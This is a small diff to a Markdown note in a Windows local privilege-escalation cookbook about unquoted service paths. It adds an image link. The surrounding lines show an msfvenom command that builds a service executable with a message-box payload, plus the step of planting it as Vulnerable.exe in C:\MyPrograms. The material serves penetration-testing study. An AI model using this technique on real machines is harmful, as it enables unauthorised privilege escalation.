@@ -53,6 +53,8 @@ On Kali:
 msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Successful Execution :)" TITLE="CrimsonCORE" -f exe-service -o Vulnerable.exe
 ```
 
+![image](./images/unq_msfbox.jpg)
+
 Then drop metasploit payload (renamed to Vulnerable.exe) in C:\MyPrograms.
 
   https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/UnquotedServicePath.md
